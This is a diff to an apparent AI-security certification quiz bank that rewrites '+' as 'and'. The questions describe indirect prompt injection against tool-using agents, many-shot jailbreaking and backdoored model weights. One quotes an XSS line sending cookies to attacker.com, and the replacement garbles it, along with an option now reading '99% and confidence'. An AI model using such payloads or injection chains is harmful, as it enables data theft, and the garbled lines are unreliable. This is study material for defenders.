@@ -1306,7 +1306,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'Emerging Trends',
     difficulty: 'intermediate',
     certTags: ['SecAI', 'GIAC-GOAA'],
-    question: 'What is the ReAct (Reason + Act) framework for AI agents?',
+    question: 'What is the ReAct (Reason and Act) framework for AI agents?',
     options: [
       'A safety framework that reviews actions before execution',
       'An agent architecture that interleaves reasoning steps with tool calls',
@@ -7912,7 +7912,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['SecAI', 'GIAC-GOAA', 'CAIS'],
     question: 'A red team is tasked with evaluating an LLM-powered customer service bot before production release. Which structured methodology covers the most comprehensive set of AI-specific threats?',
     options: [
-      'MITRE ATLAS + OWASP LLM Top 10 combined',
+      'MITRE ATLAS and OWASP LLM Top 10 combined',
       'PTES adapted for AI',
       'OWASP Web Application Top 10',
       'CVE and NVD search for the LLM framework version in use'],
@@ -8019,7 +8019,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAIS', 'CAISP', 'SecAI', 'SCS-C03'],
     question: 'Which hardening measure most directly reduces the risk of an LLM being used to generate functional malware despite safety training?',
     options: [
-      'Layered defense, input classifier for malicious code intent + output classifier for exploit patterns + sandbox if code execution is a feature',
+      'Layered defense, input classifier for malicious code intent and output classifier for exploit patterns and sandbox if code execution is a feature',
       'Rate limit API requests to 100 per hour so adversarial users cannot iterate on prompts fast enough to succeed',
       'Encrypt the model weights at rest so stolen weights cannot be repurposed to generate malware in an unrestricted environment',
       'Add a disclaimer to the system prompt stating that generating malware or exploit code is prohibited by the deployment',
@@ -8262,7 +8262,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'Red Teaming AI',
     difficulty: 'advanced',
     certTags: ['GIAC-GOAA', 'SecAI', 'CAISP'],
-    question: 'An agent with web_search + read_file + send_email + execute_sql visits an attacker-controlled webpage. What attack + max impact?',
+    question: 'An agent with web_search and read_file and send_email and execute_sql visits an attacker-controlled webpage. What attack and max impact?',
     options: [
       'Indirect prompt injection via web content, embedded instructions redirect the agent to abuse each tool for SQL exfil, file read, and email delivery in one chain',
       'A denial-of-service attack that causes the agent to enter an infinite loop and exhaust its inference budget on the target',
@@ -10907,7 +10907,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'AI Security',
     difficulty: 'advanced',
     certTags: ['SecAI', 'CAISP', 'SCS-C03'],
-    question: 'What distinguishes AI purple team exercises from standard red team + blue team engagements?',
+    question: 'What distinguishes AI purple team exercises from standard red team and blue team engagements?',
     options: [
       'Purple team exercises focus exclusively on multimodal AI models',
       'In AI purple team exercises, red team and blue team work simultaneously and share real-time findings',
@@ -12146,10 +12146,10 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
   certTags: ['SecAI', 'CAISP', 'CAIS', 'SCS-C03'],
   question: 'Which two controls MOST directly mitigate the risk of downloading a malicious pre-trained model from a public repository?',
   options: [
-      'Code signing for training scripts + RBAC on the model registry',
-      'Network egress filtering + private VPN for the training cluster',
-      'Hash verification of weights + ML security scanning',
-      'Input validation at inference + output content filtering'
+      'Code signing for training scripts and RBAC on the model registry',
+      'Network egress filtering and private VPN for the training cluster',
+      'Hash verification of weights and ML security scanning',
+      'Input validation at inference and output content filtering'
     ],
   correct: 2,
   explanation: 'Model weight supply chain risk is mitigated by: (1) verifying the cryptographic hash of downloaded weights against the published checksum; and (2) scanning weight files with ML security tools like ModelScan that detect malicious payloads in pickle/safetensors files. Source: OWASP LLM05; NIST SP 800-218A ML SSDF.',
@@ -13951,7 +13951,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['GIAC-GASAE', 'SC-500', 'SecAI', 'SCS-C03'],
     question: 'Microsoft Sentinel Fusion ML detects a multi-stage attack by correlating alerts from different sources. Which combination of events would Fusion most likely correlate into a single "Compromised account leading to ransomware" incident?',
     options: [
-      'Three failed password attempts + one successful login from the same IP address within 60 seconds',
+      'Three failed password attempts and one successful login from the same IP address within 60 seconds',
       'Five users receiving the same phishing email within one hour',
       'Sentinel Fusion correlates, Entra ID Identity Protection',
       'A single Defender for Cloud high-severity alert about a cryptocurrency mining process running on an Azure VM'],
@@ -14409,10 +14409,10 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAIS', 'SecAI', 'CAISP', 'SCS-C03'],
     question: 'DP-SGD (Differentially Private Stochastic Gradient Descent) protects training data privacy. Which two operations does DP-SGD add to standard SGD?',
     options: [
-      'Per-sample gradient clipping + calibrated Gaussian noise addition',
-      'Gradient quantization + gradient sparsification to reduce memorization',
-      'Federated averaging + secure multiparty computation',
-      'Randomized dropout + batch shuffling'],
+      'Per-sample gradient clipping and calibrated Gaussian noise addition',
+      'Gradient quantization and gradient sparsification to reduce memorization',
+      'Federated averaging and secure multiparty computation',
+      'Randomized dropout and batch shuffling'],
     correct: 0,
     explanation: 'DP-SGD (Abadi et al. 2016): (1) Clip each per-sample gradient to L2 norm ≤ C (sensitivity bound, limits how much any one sample can influence the model); (2) Add Gaussian noise N(0, σ²C²) to the sum of clipped gradients before averaging (privacy guarantee proportional to noise scale and batch size). The privacy cost accumulates per step; the moments accountant (or Rényi DP composition) tracks the total (ε, δ)-DP guarantee. Trade-off: higher privacy (smaller ε) requires more noise → worse model utility. Source: Abadi et al. "Deep Learning with Differential Privacy" (2016); CAIS Domain 2.',
   },
@@ -14490,7 +14490,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
       'Defense in depth, deploy multiple LLM safety classifiers in sequence, each with different training, before any tool call executes',
       'Output sanitization, strip all HTML and code from the model\'s text outputs before executing any action derived from the response',
       'Prompt separation, holding untrusted data in a second context',
-      'Least privilege + explicit human confirmation gates, grant the agent minimum necessary tool permissions'],
+      'Least privilege and explicit human confirmation gates, grant the agent minimum necessary tool permissions'],
     correct: 3,
     explanation: 'Securing agentic AI (OWASP LLM08, CAIS Domain 3): (1) Least privilege, agents should request only permissions needed for the current task, prefer read-only where write isn\'t needed; (2) Human-in-the-loop, irreversible or high-impact actions require explicit confirmation (defense against compromised agent following attacker instructions); (3) Audit logging, every tool call logged with the full context that triggered it; (4) Rate limiting on tool calls; (5) Scope containment, separate agent instances for different trust zones. The dual-LLM architecture (one processes untrusted content, one decides actions) is a defense-in-depth addition. Source: OWASP LLM Top 10 2025 LLM08; NIST AI RMF MS-2.6; CAIS Domain 3.',
   },
@@ -15019,7 +15019,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAISP', 'CAIS', 'SecAI', 'SCS-C03'],
     question: 'A fraud detection model starts blocking thousands of legitimate customers. Which IR sequence should the AI security team follow?',
     options: [
-      'Contain via rule-based fallback, preserve model + logs, root-cause',
+      'Contain via rule-based fallback, preserve model and logs, root-cause',
       'Immediately retrain the model on the current failure cases to correct the false positives',
       'Roll back to the previous model version without investigation',
       'Disable the AI entirely, revert to manual fraud review, and rebuild a replacement model from scratch',
@@ -15134,7 +15134,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAIS', 'CAISP', 'GIAC-GOAA', 'SecAI'],
     question: 'What distinguishes Microsoft AI Red Team methodology from traditional penetration testing?',
     options: [
-      'It targets safety + responsible-AI + security failures together, uses adversarial personas over vuln categories, and outputs harm scenarios rather than a CVE list',
+      'It targets safety and responsible-AI and security failures together, uses adversarial personas over vuln categories, and outputs harm scenarios rather than a CVE list',
       'It uses only automated tooling, while traditional pentesting relies on manual exploitation and analyst tradecraft',
       'It requires only black-box access, while traditional penetration testing requires source-code access to succeed',
       'It is a one-time pre-deployment activity, while traditional penetration testing is performed continuously in production',
@@ -15354,7 +15354,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'AI Ethics & Bias',
     difficulty: 'intermediate' as const,
     certTags: ['Google-MLE', 'AWS-AIF-C01', 'SecAI'],
-    question: 'Google\'s PAIR (People + AI Research) Guidebook and Responsible AI practices recommend "model cards" and disaggregated evaluation. A team trains a speech recognition model for customer service. What disaggregation is most critical for fairness evaluation?',
+    question: 'Google\'s PAIR (People and AI Research) Guidebook and Responsible AI practices recommend "model cards" and disaggregated evaluation. A team trains a speech recognition model for customer service. What disaggregation is most critical for fairness evaluation?',
     options: [
       'Disaggregate performance metrics by demographic group characteristics correlated with speech patterns, accent and dialect, gender, age group, and environmental recording conditions',
       'Disaggregate by call center location, regional infrastructure differences explain performance gaps without reflecting model bias',
@@ -15642,7 +15642,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'Azure AI Developer',
     difficulty: 'intermediate' as const,
     certTags: ['Azure-AI103', 'Azure-AI901', 'SecAI'],
-    question: 'When implementing RAG with Azure AI Foundry + Azure AI Search, what is the purpose of the "chunk overlap" parameter when splitting documents into chunks?',
+    question: 'When implementing RAG with Azure AI Foundry and Azure AI Search, what is the purpose of the "chunk overlap" parameter when splitting documents into chunks?',
     options: [
       'Chunk overlap shares text between adjacent chunks',
       'Chunk overlap reduces the total number of stored vectors',
@@ -16007,7 +16007,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['SecAI', 'AWS-AIF-C01', 'Azure-AI901', 'SCS-C03'],
     question: 'Under the shared-responsibility model for managed AI (Bedrock, Azure OpenAI), what stays with the customer?',
     options: [
-      'App code + API-key handling, IAM and access, input validation + output filtering, data classification, industry compliance, and prompt design',
+      'App code and API-key handling, IAM and access, input validation and output filtering, data classification, industry compliance, and prompt design',
       'The cloud provider assumes full security responsibility for every AI workload under the managed-service model',
       'The only customer-side responsibility is choosing a strong password for the cloud console account used to invoke the managed AI service',
       'The customer is only responsible for paying the monthly invoice',
@@ -16179,7 +16179,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['GIAC-GASAE', 'SecAI', 'CAIS', 'SCS-C03'],
     question: 'What is the most reliable way to keep a customer-service chatbot from producing off-topic responses?',
     options: [
-      'Layer scope-bounded system prompt + input classifier + output classifier + rate limiting, no single control is sufficient alone',
+      'Layer scope-bounded system prompt and input classifier and output classifier and rate limiting, no single control is sufficient alone',
       'Add "Do not discuss topics outside customer service" to the system prompt',
       'Store all sensitive scope rules in the system prompt and trust the model\'s instruction-following to enforce them confidentially',
       'Deploy a smaller, less capable LLM whose reduced capability set makes it structurally unable to produce off-topic content',
@@ -16226,7 +16226,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['GIAC-GASAE', 'SecAI', 'SC-500', 'SCS-C03'],
     question: 'What is the correct logging strategy for a production LLM application balancing incident investigation with privacy?',
     options: [
-      'Log metadata + safety-filter events + anomaly scores',
+      'Log metadata and safety-filter events and anomaly scores',
       'Log everything, full inputs, full responses, all metadata, for maximum investigative capability',
       'Only log errors and exceptions',
       'Skip logging entirely, LLMs are stateless and cannot be attacked through historical prompt or response patterns over time',
@@ -16240,7 +16240,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'AI Application Security',
     difficulty: 'advanced' as const,
     certTags: ['GIAC-GASAE', 'SecAI', 'CAISP', 'SCS-C03'],
-    question: 'An LLM agent with send_email + read_database tools obeys instructions hidden inside a retrieved customer record and emails a data dump externally. What attack is this and what control blocks it?',
+    question: 'An LLM agent with send_email and read_database tools obeys instructions hidden inside a retrieved customer record and emails a data dump externally. What attack is this and what control blocks it?',
     options: [
       'Indirect prompt injection via retrieved content',
       'A SQL injection at the database layer',
@@ -16718,7 +16718,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['SecAI', 'SC-500', 'SCS-C03'],
     question: 'What makes Security Copilot referencing Defender Threat Intelligence data security-relevant versus a standard AI chatbot?',
     options: [
-      'It connects live to Microsoft-curated TI feeds + enterprise signals, grounding answers in current data with source citation',
+      'It connects live to Microsoft-curated TI feeds and enterprise signals, grounding answers in current data with source citation',
       'It independently validates its own output against a database of verified security facts',
       'It runs in an air-gapped environment by default, so no organizational data can ever leave the enterprise network under normal operation',
       'It generates AI-signed threat reports that are automatically legally admissible as evidence in cybercrime prosecutions across jurisdictions',
@@ -17912,7 +17912,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'Red Teaming AI',
     difficulty: 'advanced' as const,
     certTags: ['CAIS', 'GIAC-GOAA', 'CAISP', 'SecAI'],
-    question: 'An agentic AI uses a ReAct (Reasoning + Acting) loop where the LLM plans actions, executes tools, and processes results iteratively. What is the primary security risk introduced by tool result processing?',
+    question: 'An agentic AI uses a ReAct (Reasoning and Acting) loop where the LLM plans actions, executes tools, and processes results iteratively. What is the primary security risk introduced by tool result processing?',
     options: [
       'Indirect injection via tool results',
       'Tool enumeration by the planner',
@@ -18880,7 +18880,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'AI Governance',
     difficulty: 'intermediate' as const,
     certTags: ['GIAC-GOAA', 'CAISP', 'SecAI', 'GIAC-GASAE', 'SCS-C03'],
-    question: 'What supply-chain attack vector does downloading a pre-trained LLM + light fine-tuning introduce over from-scratch training?',
+    question: 'What supply-chain attack vector does downloading a pre-trained LLM and light fine-tuning introduce over from-scratch training?',
     options: [
       'A pre-implanted trigger-activated backdoor in the base weights that survives fine-tuning',
       'Fine-tuning a downloaded model likely violates the original license and creates a legal supply-chain risk for the deploying organization',
@@ -19119,7 +19119,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAIS', 'CAISP', 'SecAI', 'SCS-C03'],
     question: 'Which layered defense best protects an LLM app that processes user-provided documents from prompt injection?',
     options: [
-      'Privilege separation for untrusted content + schema-validated output + human approval above a defined impact threshold',
+      'Privilege separation for untrusted content and schema-validated output and human approval above a defined impact threshold',
       'Prepend a detailed system-prompt instruction before all document content prohibiting the model from following embedded instructions',
       'Use a smaller, less capable model to process the documents',
       'Keyword filtering that strips document text of any token matching a known injection-keyword list before it reaches the LLM',
@@ -19164,7 +19164,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'AI Application Security',
     difficulty: 'intermediate' as const,
     certTags: ['CAIS', 'CAISP', 'SecAI', 'SCS-C03'],
-    question: 'Before logging every LLM prompt + response for audit, what privacy consideration must be reviewed?',
+    question: 'Before logging every LLM prompt and response for audit, what privacy consideration must be reviewed?',
     options: [
       'Prompts often contain PII and PHI',
       'Production deployments must encrypt logs at rest, but privacy regulation does not restrict what content is written to those logs',
@@ -19230,7 +19230,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAISP', 'CAIS', 'SecAI', 'SCS-C03'],
     question: 'An LLM SQL-generator output "SELECT * FROM users; DROP TABLE audit_logs;" and it ran. Which defense layer should have prevented execution?',
     options: [
-      'Output validation + SELECT-only allow-list + parameterization + read-only DB creds',
+      'Output validation and SELECT-only allow-list and parameterization and read-only DB creds',
       'Fine-tune the model with reinforcement to never emit destructive SQL commands under any prompt in production',
       'Enrich the system prompt with an explicit instruction telling the LLM not to generate DROP TABLE statements ever',
       'Sanitize the user input to strip SQL keywords before it is sent to the LLM for query generation and translation',
@@ -19246,7 +19246,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAISP', 'CAIS', 'SecAI', 'GIAC-GOAA', 'SCS-C03'],
     question: 'Which set of items must an AI-BOM document to address supply-chain risk for an LLM application?',
     options: [
-      'Base model provenance + fine-tuning datasets + third-party plugins + training-infra dependencies',
+      'Base model provenance and fine-tuning datasets and third-party plugins and training-infra dependencies',
       'Just the model\'s benchmark performance numbers on the standard academic evaluation datasets published with the release',
       'Only the parameter count and total training compute used to produce the base model, expressed in FLOPs and GPU-hours',
       'The hardware specifications of the servers used for training the model',
@@ -19519,7 +19519,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAISP', 'CAIS', 'SecAI', 'GIAC-GOAA', 'SCS-C03'],
     question: 'How does spotlighting defend against prompt injection, and what is its fundamental limitation?',
     options: [
-      'Wraps untrusted content in delimiters + a system rule to treat it as data-only',
+      'Wraps untrusted content in delimiters and a system rule to treat it as data-only',
       'Encrypts the user input before inserting it into the prompt so the model cannot follow instructions embedded in it',
       'Prevents untrusted content from being placed in the context at all by filtering it at the application layer before the LLM call',
       'Runs a separate classifier model that scans untrusted content and blocks it before the main LLM ever sees the prompt',
@@ -19550,7 +19550,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAISP', 'SecAI', 'SC-500', 'SCS-C03'],
     question: 'Which design decision reflects Zero Trust (NIST SP 800-207) applied to an AI model?',
     options: [
-      'Every AI tool call and data access is authorized per-request at the enforcement point, using the same identity + policy checks as human access',
+      'Every AI tool call and data access is authorized per-request at the enforcement point, using the same identity and policy checks as human access',
       'Give the AI model read-only access across every enterprise system to eliminate write-related security risk in one step',
       'Encrypt every AI interaction end-to-end using TLS 1.3 as the primary Zero Trust control on the AI workload',
       'Deploy the AI model in an isolated network segment with no internet access as the primary Zero Trust boundary',
@@ -19724,7 +19724,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAISP', 'CAIS', 'SecAI', 'SCS-C03'],
     question: 'A production chatbot\'s system prompt contains "Your database password is Acme2024!". What is the primary vulnerability this introduces?',
     options: [
-      'OWASP LLM07 System Prompt Leakage + credential mismanagement',
+      'OWASP LLM07 System Prompt Leakage and credential mismanagement',
       'OWASP LLM06 Sensitive Information Disclosure only',
       'Privilege escalation',
       'Training data poisoning',
@@ -21520,7 +21520,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     options: [
       'Sending the same jailbreak prompt many times to increase statistical success probability',
       'Using many different jailbreak templates in sequence to find one that works',
-      'Prefilling the context with 100+ compliant-response demonstration pairs that normalize target behavior',
+      'Prefilling the context with 100 or more compliant-response demonstration pairs that normalize target behavior',
       'Using concurrent API sessions to bypass per-session safety filtering'],
     correct: 2,
     explanation: 'Many-shot jailbreaking (Anil et al., 2024) exploits long context windows: 100+ demonstration pairs showing progressively sensitive compliance shift the model\'s in-context behavior norm. Alignment training does not fully generalize to the in-context few-shot setting at high example volumes. Longer context windows increase exposure. GIAC GOAA Domain 4.',
@@ -24122,7 +24122,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['AWS-AIF-C01', 'CAISP', 'SecAI', 'SCS-C03'],
     question: 'What is the most critical supply-chain practice when pulling a foundation model from Bedrock or Hugging Face for enterprise use?',
     options: [
-      'Verify the publisher hash, review the model card for provenance + bias, check the license, and scan the repo for unexpected code',
+      'Verify the publisher hash, review the model card for provenance and bias, check the license, and scan the repo for unexpected code',
       'Deploy the model in a separate AWS account from production workloads to ensure logical isolation of any incident blast radius',
       'Fine-tune the model on company data before deploying it to production',
       'Restrict use to models trained exclusively on data the deploying organization owns and has independently audited itself',
@@ -24580,7 +24580,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'LLM Defense Techniques',
     difficulty: 'intermediate' as const,
     certTags: ['SecAI'],
-    question: 'An AI chatbot embedded in a web application renders markdown responses including HTML. An attacker crafts a prompt that causes the AI to output <script>document.location=\'https://attacker.com/steal?c=\'+document.cookie</script>. What is this attack and what prevents it?',
+    question: 'An AI chatbot embedded in a web application renders markdown responses including HTML. An attacker crafts a prompt that causes the AI to output <script>document.location=\'https://attacker.com/steal?c=\' and document.cookie</script>. What is this attack and what prevents it?',
     options: [
       'LLM02 Insecure Output Handling leading to XSS',
       'Prompt injection → prevented by output length limits',
@@ -24673,7 +24673,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     category: 'AI Governance',
     difficulty: 'intermediate' as const,
     certTags: ['SecAI', 'AWS-AIF-C01', 'SCS-C03'],
-    question: 'A hiring model penalizes graduates of certain universities because they were underrepresented in past successful hires. What bias type + mitigation?',
+    question: 'A hiring model penalizes graduates of certain universities because they were underrepresented in past successful hires. What bias type and mitigation?',
     options: [
       'Historical or societal bias',
       'Overfitting-driven algorithmic bias',
@@ -24865,7 +24865,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['GIAC-GOAA', 'SecAI'],
     question: 'What is the primary advantage of automated red-team tools (PyRIT, Garak) over purely manual LLM red teaming?',
     options: [
-      'Scale + regression coverage, thousands of variants across the full harm taxonomy in hours, and repeatable runs before and after each model update',
+      'Scale and regression coverage, thousands of variants across the full harm taxonomy in hours, and repeatable runs before and after each model update',
       'Automated tools are consistently more accurate than human red teamers at surfacing novel and creative safety failures in modern LLMs',
       'Automated tools reproduce human red team findings once tuned',
       'Automated tools work only on simple rule-based chatbots',
@@ -25515,7 +25515,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['GIAC-GASAE', 'SecAI', 'SCS-C03'],
     question: 'Before sending sensitive security data through a shared multi-tenant LLM inference service, which isolation guarantees must be verified?',
     options: [
-      'Cross-tenant data + model isolation, prompt and response opt-out from training, data residency, and evidence via SOC 2 or ISO 27001 + a signed DPA',
+      'Cross-tenant data and model isolation, prompt and response opt-out from training, data residency, and evidence via SOC 2 or ISO 27001 and a signed DPA',
       'Confirm the vendor has a working website and a published privacy policy',
       'None, shared inference services have no additional security considerations beyond password length',
       'None, multi-tenant SaaS providers inherently guarantee complete isolation without customer verification',
@@ -25808,7 +25808,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAIS', 'SecAI', 'SCS-C03'],
     question: 'What must AI audit logs capture that traditional application audit logs do not?',
     options: [
-      'Full prompt + model version + inference params + full output + agentic reasoning trace',
+      'Full prompt and model version and inference params and full output and agentic reasoning trace',
       'Only the final action taken by the AI',
       'Nothing extra, AI application audit logs are identical to traditional application logs for governance and forensics',
       'Only required to capture anything at all when the AI system serves more than 1,000 daily active users in production',
@@ -27169,7 +27169,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     options: [
       'Calibrated confidence for the alert class, business context, corroborating signals, false-positive history, asset criticality, and pattern-vs-isolated recency',
       'Isolate the affected host immediately for every high-severity alert, then investigate after the containment action is complete',
-      'Immediate response only for alerts scoring 99%+ confidence',
+      'Immediate response only for alerts scoring 99% and confidence',
       'Trust the ML confidence, any high-severity alert is a real incident and requires the maximum-response playbook right away',
     ],
     correct: 0,
@@ -27325,7 +27325,7 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     question: 'Which AWS combination provides compliance and governance traceability for ML models in production?',
     options: [
       'AWS CloudTrail with data events',
-      'SageMaker Model Cards + Model Registry',
+      'SageMaker Model Cards and Model Registry',
       'Amazon Inspector for ML images',
       'AWS Config with custom rules'
     ],
